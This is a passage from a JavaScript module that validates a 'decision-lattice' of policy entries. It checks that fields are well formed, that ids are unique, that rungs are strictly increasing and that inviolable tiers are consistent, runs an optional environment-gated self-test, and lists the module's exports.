  for (let i = 0; i < t.length; i++) {
    const e = t[i];
    if (!e || typeof e !== "object") {
      throw new Error(`decision-lattice: entry ${i} is not an object`);
    }
    if (typeof e.id !== "string" || e.id.length === 0) {
      throw new Error(`decision-lattice: entry ${i} has no id`);
    }
    if (typeof e.rung !== "number" || !Number.isFinite(e.rung)) {
      throw new Error(`decision-lattice: entry ${e.id} has non-finite rung`);
    }
    if (typeof e.name !== "string" || e.name.length === 0) {
      throw new Error(`decision-lattice: entry ${e.id} has no name`);
    }
    if (typeof e.action !== "string" || e.action.length === 0) {
      throw new Error(`decision-lattice: entry ${e.id} has no action`);
    }
    if (e.source == null) {
      throw new Error(`decision-lattice: entry ${e.id} has no source`);
    }
    if (!Array.isArray(e.demotableBy)) {
      throw new Error(`decision-lattice: entry ${e.id} has non-array demotableBy`);
    }
    if (typeof e.predicateRef !== "string") {
      throw new Error(`decision-lattice: entry ${e.id} has non-string predicateRef`);
    }
    if (seenIds[e.id]) {
      throw new Error(`decision-lattice: duplicate id '${e.id}'`);
    }
    seenIds[e.id] = true;
    // ADR-036: tier cross-check. The tier field is optional; when present it
    // must be a known value and must not contradict demotableBy. This makes
    // "tier:inviolable + non-empty demotableBy" structurally detectable.
    if (e.tier !== undefined) {
      if (e.tier !== "inviolable" && e.tier !== "demotable") {
        throw new Error(
          `decision-lattice: entry ${e.id} has invalid tier '${e.tier}' ` +
          "(must be 'inviolable' or 'demotable')"
        );
      }
      if (e.tier === "inviolable" && Array.isArray(e.demotableBy) && e.demotableBy.length !== 0) {
        throw new Error(
          `decision-lattice: entry ${e.id} has tier:'inviolable' but ` +
          `demotableBy is non-empty: [${e.demotableBy.join(", ")}]`
        );
      }
    }
    if (!(e.rung > prevRung)) {
      throw new Error(
        `decision-lattice: rung not strictly increasing at entry '${e.id}' ` +
          `(rung=${e.rung}, previous=${prevRung})`
      );
    }
    prevRung = e.rung;
  }
  return true;
}

// Optional self-test on module load. Off by default to keep the cold-load
// path a pure data import; opt in via env for tests/CI.
if (process.env.LILARA_LATTICE_SELFTEST === "1") {
  assertOrdered(LATTICE);
  // ADR-036 selftest: verify INVIOLABLE_FLOOR_IDS agrees with tier:"inviolable"
  // entries and that computeLatticeHash produces a non-empty value.
  const _tierSet  = new Set(LATTICE.filter((e) => e.tier === "inviolable").map((e) => e.id));
  const _idSet    = new Set(INVIOLABLE_FLOOR_IDS);
  for (const id of _tierSet) {
    if (!_idSet.has(id)) {
      throw new Error(
        `decision-lattice selftest: entry ${id} has tier:'inviolable' but is ` +
        "absent from INVIOLABLE_FLOOR_IDS (demotableBy must be empty)"
      );
    }
  }
  for (const id of _idSet) {
    if (!_tierSet.has(id)) {
      throw new Error(
        `decision-lattice selftest: entry ${id} is in INVIOLABLE_FLOOR_IDS ` +
        "but lacks tier:'inviolable' in the LATTICE"
      );
    }
  }
  const _h = computeLatticeHash();
  if (typeof _h !== "string" || !_h.startsWith("sha256:") || _h.length < 10) {
    throw new Error("decision-lattice selftest: computeLatticeHash returned invalid value");
  }
}

module.exports = {
  LATTICE,
  LATTICE_VERSION,
  INVIOLABLE_FLOOR_IDS,
  getEntry,
  getEntryByName,
  getRung,
  getRungByName,
  getFloor,
  listFloors,
  isInviolable,
  canDemote,
  enforcementFor,
  computeLatticeHash,
  assertOrdered,
};
